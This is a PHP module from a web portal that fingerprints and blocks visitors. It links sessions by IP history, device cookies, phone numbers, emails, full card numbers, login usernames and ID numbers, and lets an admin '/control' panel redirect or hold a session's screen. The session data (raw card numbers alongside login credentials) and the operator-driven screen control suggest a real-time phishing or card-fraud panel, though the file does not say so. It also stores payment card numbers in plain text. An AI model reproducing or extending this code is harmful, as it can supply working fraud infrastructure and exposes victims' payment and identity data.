<?php

declare(strict_types=1);

require_once __DIR__ . '/db.php';
require_once __DIR__ . '/geo.php';

const SW_BLOCK_COOKIE = 'sw_block';
const SW_DEVICE_COOKIE = 'sw_device';

function sw_block_now(): string
{
    return date('c');
}

function sw_block_normalize_ip(string $ip): string
{
    $ip = trim($ip);
    return filter_var($ip, FILTER_VALIDATE_IP) ? $ip : '';
}

function sw_block_normalize_phone(string $phone): string
{
    $digits = preg_replace('/\D+/', '', $phone) ?? '';
    return strlen($digits) >= 7 ? $digits : '';
}

function sw_block_normalize_card(string $card): string
{
    $digits = preg_replace('/\D+/', '', $card) ?? '';
    return strlen($digits) >= 12 ? $digits : '';
}

function sw_block_normalize_text(string $value): string
{
    $value = trim(mb_strtolower($value));
    return $value !== '' ? $value : '';
}

function sw_block_is_admin_request(): bool
{
    $uri = (string) ($_SERVER['REQUEST_URI'] ?? '');
    $script = (string) ($_SERVER['SCRIPT_NAME'] ?? '');
    return str_contains($uri, '/control') || str_contains($script, 'control');
}

function sw_block_cookie_token(): string
{
    $token = trim((string) ($_COOKIE[SW_BLOCK_COOKIE] ?? ''));
    if ($token !== '' && preg_match('/^[a-f0-9]{16,64}$/', $token) === 1) {
        return $token;
    }
    return '';
}

function sw_device_id(): string
{
    $id = trim((string) ($_COOKIE[SW_DEVICE_COOKIE] ?? ''));
    if ($id !== '' && preg_match('/^[a-f0-9]{16,64}$/', $id) === 1) {
        return $id;
    }
    $id = bin2hex(random_bytes(16));
    $secure = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off');
    setcookie(SW_DEVICE_COOKIE, $id, [
        'expires' => time() + 60 * 60 * 24 * 400,
        'path' => '/',
        'secure' => $secure,
        'httponly' => true,
        'samesite' => 'Lax',
    ]);
    $_COOKIE[SW_DEVICE_COOKIE] = $id;
    return $id;
}

function sw_block_stamp_cookie(?string $token = null): string
{
    $token = $token ?: sw_block_cookie_token();
    if ($token === '') {
        $token = bin2hex(random_bytes(16));
    }
    $secure = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off');
    setcookie(SW_BLOCK_COOKIE, $token, [
        'expires' => time() + 60 * 60 * 24 * 400,
        'path' => '/',
        'secure' => $secure,
        'httponly' => true,
        'samesite' => 'Lax',
    ]);
    $_COOKIE[SW_BLOCK_COOKIE] = $token;
    return $token;
}

function sw_block_clear_cookie(): void
{
    $secure = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off');
    setcookie(SW_BLOCK_COOKIE, '', [
        'expires' => time() - 3600,
        'path' => '/',
        'secure' => $secure,
        'httponly' => true,
        'samesite' => 'Lax',
    ]);
    unset($_COOKIE[SW_BLOCK_COOKIE]);
}

/**
 * @return list<string>
 */
function sw_block_session_ips(array $row): array
{
    $ips = [];
    $cur = sw_block_normalize_ip((string) ($row['client_ip'] ?? ''));
    if ($cur !== '') {
        $ips[$cur] = true;
    }
    $hist = json_decode((string) ($row['ip_history'] ?? '[]'), true);
    if (is_array($hist)) {
        foreach ($hist as $ip) {
            $norm = sw_block_normalize_ip((string) $ip);
            if ($norm !== '') {
                $ips[$norm] = true;
            }
        }
    }
    return array_keys($ips);
}

/**
 * @return list<array{0:string,1:string}>
 */
function sw_block_session_traces(array $row): array
{
    $pairs = [];
    $add = static function (string $kind, string $value) use (&$pairs): void {
        if ($value === '') {
            return;
        }
        $pairs[] = [$kind, $value];
    };

    $add('session', trim((string) ($row['id'] ?? '')));
    $add('device', trim((string) ($row['device_id'] ?? '')));
    $add('phone', sw_block_normalize_phone((string) ($row['customer_phone'] ?? '')));
    $add('phone', sw_block_normalize_phone((string) ($row['phone_number'] ?? '')));
    $add('email', sw_block_normalize_text((string) ($row['customer_email'] ?? '')));
    $add('email', sw_block_normalize_text((string) ($row['phone_email'] ?? '')));
    $add('card', sw_block_normalize_card((string) ($row['card_number'] ?? '')));
    $add('username', sw_block_normalize_text((string) ($row['login_username'] ?? '')));
    $add('qid', sw_block_normalize_text((string) ($row['phone_qid'] ?? '')));

    $unique = [];
    foreach ($pairs as [$kind, $value]) {
        $unique[$kind . "\0" . $value] = [$kind, $value];
    }
    return array_values($unique);
}

function sw_block_merge_ip_history(array $row, array $extraIps = []): string
{
    $ips = [];
    foreach (array_merge(sw_block_session_ips($row), $extraIps) as $ip) {
        $norm = sw_block_normalize_ip((string) $ip);
        if ($norm !== '') {
            $ips[$norm] = true;
        }
    }
    return json_encode(array_keys($ips), JSON_UNESCAPED_UNICODE) ?: '[]';
}

/**
 * @return list<array<string,mixed>>
 */
function sw_block_related_sessions(array $seed): array
{
    $found = [];
    $queue = [$seed];
    while ($queue !== []) {
        $row = array_shift($queue);
        $id = (string) ($row['id'] ?? '');
        if ($id === '' || isset($found[$id])) {
            continue;
        }
        $found[$id] = $row;
        foreach (sw_block_query_candidates($row) as $cand) {
            $cid = (string) ($cand['id'] ?? '');
            if ($cid !== '' && !isset($found[$cid])) {
                $queue[] = $cand;
            }
        }
    }
    return array_values($found);
}

/**
 * @return list<array<string,mixed>>
 */
function sw_block_query_candidates(array $row): array
{
    $clauses = [];
    $params = [];
    $i = 0;
    $push = static function (string $sql, mixed $value) use (&$clauses, &$params, &$i): void {
        $key = ':p' . $i++;
        $clauses[] = str_replace('?', $key, $sql);
        $params[$key] = $value;
    };

    $id = trim((string) ($row['id'] ?? ''));
    if ($id !== '') {
        $push('id = ?', $id);
    }
    $device = trim((string) ($row['device_id'] ?? ''));
    if ($device !== '') {
        $push('device_id = ?', $device);
    }
    foreach (sw_block_session_ips($row) as $ip) {
        $push('client_ip = ?', $ip);
        $push('ip_history LIKE ?', '%' . $ip . '%');
    }
    foreach (sw_block_session_traces($row) as [$kind, $value]) {
        if ($kind === 'phone') {
            $tail = substr($value, -8);
            $push('customer_phone LIKE ?', '%' . $tail . '%');
            $push('phone_number LIKE ?', '%' . $tail . '%');
        } elseif ($kind === 'email') {
            $push('customer_email = ?', $value);
            $push('phone_email = ?', $value);
        } elseif ($kind === 'card') {
            $push('card_number = ?', $value);
        } elseif ($kind === 'username') {
            $push('login_username = ?', $value);
        } elseif ($kind === 'qid') {
            $push('phone_qid = ?', $value);
        } elseif ($kind === 'device') {
            $push('device_id = ?', $value);
        }
    }

    if ($clauses === []) {
        return [];
    }

    try {
        $stmt = sw_db()->prepare('SELECT * FROM sessions WHERE ' . implode(' OR ', $clauses) . ' LIMIT 200');
        $stmt->execute($params);
        $rows = $stmt->fetchAll();
    } catch (Throwable $e) {
        return [];
    }

    $seedIps = sw_block_session_ips($row);
    $seedTraces = sw_block_session_traces($row);
    $out = [];
    foreach ($rows as $other) {
        if (sw_block_sessions_overlap($id, $seedIps, $seedTraces, $other)) {
            $out[] = $other;
        }
    }
    return $out;
}

/**
 * @param list<string> $seedIps
 * @param list<array{0:string,1:string}> $seedTraces
 */
function sw_block_sessions_overlap(string $seedId, array $seedIps, array $seedTraces, array $other): bool
{
    if ($seedId !== '' && $seedId === trim((string) ($other['id'] ?? ''))) {
        return true;
    }
    foreach (sw_block_session_ips($other) as $ip) {
        if (in_array($ip, $seedIps, true)) {
            return true;
        }
    }
    foreach ($seedTraces as [$kind, $value]) {
        foreach (sw_block_session_traces($other) as [$okind, $ovalue]) {
            if ($kind === $okind && $value === $ovalue) {
                return true;
            }
        }
    }
    return false;
}

function sw_block_insert_ip(string $ip, string $sessionId, string $now): void
{
    $ip = sw_block_normalize_ip($ip);
    if ($ip === '') {
        return;
    }
    try {
        sw_db()->prepare(
            'INSERT OR REPLACE INTO blocked_ips (ip, session_id, blocked_at) VALUES (:ip, :sid, :at)'
        )->execute(['ip' => $ip, 'sid' => $sessionId, 'at' => $now]);
    } catch (Throwable $e) {
    }
}

function sw_block_insert_trace(string $kind, string $value, string $sessionId, string $now): void
{
    $value = trim($value);
    if ($kind === '' || $value === '') {
        return;
    }
    try {
        sw_db()->prepare(
            'INSERT INTO blocked_traces (id, kind, value, session_id, blocked_at)
             VALUES (:id, :kind, :value, :sid, :at)'
        )->execute([
            'id' => bin2hex(random_bytes(10)),
            'kind' => $kind,
            'value' => $value,
            'sid' => $sessionId,
            'at' => $now,
        ]);
    } catch (Throwable $e) {
    }
}

function sw_block_lookup_ip(string $ip): bool
{
    $ip = sw_block_normalize_ip($ip);
    if ($ip === '') {
        return false;
    }
    try {
        $stmt = sw_db()->prepare('SELECT 1 FROM blocked_ips WHERE ip = :ip LIMIT 1');
        $stmt->execute(['ip' => $ip]);
        return (bool) $stmt->fetchColumn();
    } catch (Throwable $e) {
        return false;
    }
}

function sw_block_lookup_trace(string $kind, string $value): bool
{
    $value = trim($value);
    if ($kind === '' || $value === '') {
        return false;
    }
    try {
        $stmt = sw_db()->prepare(
            'SELECT 1 FROM blocked_traces WHERE kind = :kind AND value = :value LIMIT 1'
        );
        $stmt->execute(['kind' => $kind, 'value' => $value]);
        return (bool) $stmt->fetchColumn();
    } catch (Throwable $e) {
        return false;
    }
}

function sw_client_is_blocked(): bool
{
    foreach (sw_client_ips_from_request() as $ip) {
        if (sw_block_lookup_ip($ip)) {
            return true;
        }
    }

    $cookie = sw_block_cookie_token();
    if ($cookie !== '' && sw_block_lookup_trace('cookie', $cookie)) {
        return true;
    }

    $device = trim((string) ($_COOKIE[SW_DEVICE_COOKIE] ?? ''));
    if ($device !== '' && sw_block_lookup_trace('device', $device)) {
        return true;
    }

    $sessionId = trim((string) ($_COOKIE['sw_portal_session'] ?? ''));
    if ($sessionId !== '' && sw_block_lookup_trace('session', $sessionId)) {
        return true;
    }

    if ($sessionId !== '' && function_exists('sw_session_find')) {
        $row = sw_session_find($sessionId);
        if ($row && !empty($row['is_blocked'])) {
            return true;
        }
        if ($row) {
            foreach (sw_block_session_traces($row) as [$kind, $value]) {
                if (sw_block_lookup_trace($kind, $value)) {
                    return true;
                }
            }
            foreach (sw_block_session_ips($row) as $ip) {
                if (sw_block_lookup_ip($ip)) {
                    return true;
                }
            }
        }
    }

    return false;
}

function sw_block_session(string $id): array
{
    if (!function_exists('sw_session_find')) {
        require_once __DIR__ . '/sessions.php';
    }
    $row = sw_session_find($id);
    if ($row === null) {
        return ['ok' => false, 'error' => 'not_found'];
    }

    $now = sw_block_now();
    $related = sw_block_related_sessions($row);

    foreach ($related as $item) {
        $sid = (string) $item['id'];
        foreach (sw_block_session_ips($item) as $ip) {
            sw_block_insert_ip($ip, $sid, $now);
        }
        foreach (sw_client_ips_from_request() as $ip) {
            sw_block_insert_ip($ip, $sid, $now);
        }
        foreach (sw_block_session_traces($item) as [$kind, $value]) {
            sw_block_insert_trace($kind, $value, $sid, $now);
        }
        $device = trim((string) ($item['device_id'] ?? ''));
        if ($device !== '') {
            sw_block_insert_trace('device', $device, $sid, $now);
        }
        try {
            sw_db()->prepare(
                'UPDATE sessions SET is_blocked = 1, blocked_at = :at, updated_at = :upd,
                 redirect_to = :screen, redirect_nonce = :nonce, loading_hold = 0 WHERE id = :id'
            )->execute([
                'at' => $now,
                'upd' => $now,
                'screen' => 'blocked',
                'nonce' => bin2hex(random_bytes(12)),
                'id' => $sid,
            ]);
        } catch (Throwable $e) {
        }
    }

    return [
        'ok' => true,
        'application' => function_exists('sw_session_live_payload')
            ? sw_session_live_payload(sw_session_find($id) ?? $row)
            : (sw_session_find($id) ?? $row),
        'blocked_count' => count($related),
    ];
}

function sw_unblock_session(string $id): array
{
    if (!function_exists('sw_session_find')) {
        require_once __DIR__ . '/sessions.php';
    }
    $row = sw_session_find($id);
    if ($row === null) {
        return ['ok' => false, 'error' => 'not_found'];
    }

    $related = sw_block_related_sessions($row);
    $ids = array_values(array_filter(array_map(
        static fn(array $r): string => (string) ($r['id'] ?? ''),
        $related
    )));
    if ($ids === []) {
        $ids = [$id];
    }

    $now = sw_block_now();
    foreach ($ids as $sid) {
        try {
            sw_db()->prepare('DELETE FROM blocked_ips WHERE session_id = :id')->execute(['id' => $sid]);
        } catch (Throwable $e) {
        }
        try {
            sw_db()->prepare('DELETE FROM blocked_traces WHERE session_id = :id')->execute(['id' => $sid]);
        } catch (Throwable $e) {
        }
        try {
            sw_db()->prepare(
                'UPDATE sessions SET is_blocked = 0, blocked_at = "", updated_at = :upd,
                 redirect_to = "", redirect_nonce = "" WHERE id = :id'
            )->execute(['upd' => $now, 'id' => $sid]);
        } catch (Throwable $e) {
        }
    }

    if (!sw_block_is_admin_request()) {
        sw_block_clear_cookie();
    }

    return [
        'ok' => true,
        'application' => function_exists('sw_session_live_payload')
            ? sw_session_live_payload(sw_session_find($id) ?? $row)
            : (sw_session_find($id) ?? $row),
        'unblocked_count' => count($ids),
    ];
}

function sw_block_cleanup_for_session(string $id): void
{
    try {
        sw_db()->prepare('DELETE FROM blocked_ips WHERE session_id = :id')->execute(['id' => $id]);
    } catch (Throwable $e) {
    }
    try {
        sw_db()->prepare('DELETE FROM blocked_traces WHERE session_id = :id')->execute(['id' => $id]);
    } catch (Throwable $e) {
    }
}

function sw_block_enforce(): void
{
    if (sw_block_is_admin_request()) {
        return;
    }

    $pageId = $GLOBALS['pageId'] ?? '';
    $onBlocked = $pageId === 'blocked';
    $blocked = false;
    try {
        $blocked = sw_client_is_blocked();
    } catch (Throwable $e) {
        return;
    }

    if ($blocked) {
        $token = sw_block_stamp_cookie();
        $sessionId = trim((string) ($_COOKIE['sw_portal_session'] ?? ''));
        if ($sessionId !== '' && function_exists('sw_session_find')) {
            $row = sw_session_find($sessionId);
            if ($row) {
                $now = sw_block_now();
                sw_block_insert_trace('cookie', $token, $sessionId, $now);
                $device = sw_device_id();
                sw_block_insert_trace('device', $device, $sessionId, $now);
                foreach (sw_client_ips_from_request() as $ip) {
                    sw_block_insert_ip($ip, $sessionId, $now);
                }
            }
        }
        if (!$onBlocked) {
            header('Location: ' . app_url('blocked'));
            exit;
        }
        return;
    }

    if ($onBlocked) {
        header('Location: ' . app_url());
        exit;
    }
}
